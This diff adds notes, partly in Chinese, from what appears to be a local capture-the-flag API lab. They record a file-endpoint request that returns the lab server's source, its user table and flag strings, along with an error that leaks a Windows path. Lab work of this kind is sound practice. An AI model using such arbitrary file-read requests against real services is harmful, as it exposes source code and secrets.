@@ -1,0 +1,28 @@
+GET /files?name=server.py  -> 200, content 截断至 500 字符:
+
+#!/usr/bin/env python3
+"""Local API lab: IDOR + path traversal + weak auth. 127.0.0.1:18081 only."""
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs, unquote
+import json, base64, os
+
+PORT = 18081
+USERS = {
+    "1": {"role": "user", "name": "alice"},
+    "2": {"role": "admin", "name": "bob"},
+}
+NOTES = {
+    "1": "alice-note",
+    "2": "admin-secret-FLAG{idor_user2}",
+}
+FLAG = "FLAG{api_chain_ok}"
+
+
+def b64json(o: dict) -> str:
+    return bas   (truncated @500)
+
+辅助信息:
+- GET /files?name=index.html -> {"error": "[Errno 2] No such file or directory: 'C:\\\\Users\\\\Administrator\\\\Documents\\\\GitHub\\\\helm-pi\\\\labs\\\\weblab-api\\\\index.html'"}
+- GET /robots.txt -> 404 {"error": "not found"}
+
+结论: uid=2 为 admin(bob)；FLAG 有两处：NOTES["2"] 与 FLAG 常量，与 [C]/[E] 返回一致。
